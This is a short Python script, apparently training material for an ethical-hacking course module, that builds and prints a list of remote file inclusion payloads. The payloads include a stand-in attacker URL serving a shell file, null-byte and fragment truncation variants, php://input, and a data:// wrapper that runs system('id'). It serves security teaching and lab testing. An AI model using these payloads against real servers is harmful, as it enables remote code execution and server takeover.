#!/usr/bin/env python3
# LAB-ONLY: RFI (Remote File Inclusion) Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Tests RFI vulnerabilities and payloads
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/rfi.php?page="
LAB_ATTACKER_SHELL_URL = "http://your-lab-attacker-ip/shell.txt"
# -----------------------------------------------------------------------------------

def generate_rfi_payloads(attacker_url):
    payloads = [
        attacker_url,
        attacker_url + "?",
        attacker_url + "%00",
        attacker_url + "%2500",
        attacker_url + "#",
        "php://input",
        "data://text/plain,<?php system('id'); ?>"
    ]
    return payloads

def main():
    print("="*80)
    print("LAB-ONLY: RFI Tester")
    print("="*80)
    print("[*] Payloads to test (LAB ONLY):")
    for payload in generate_rfi_payloads(LAB_ATTACKER_SHELL_URL):
        print(f"   - {payload}")

if __name__ == "__main__":
    main()
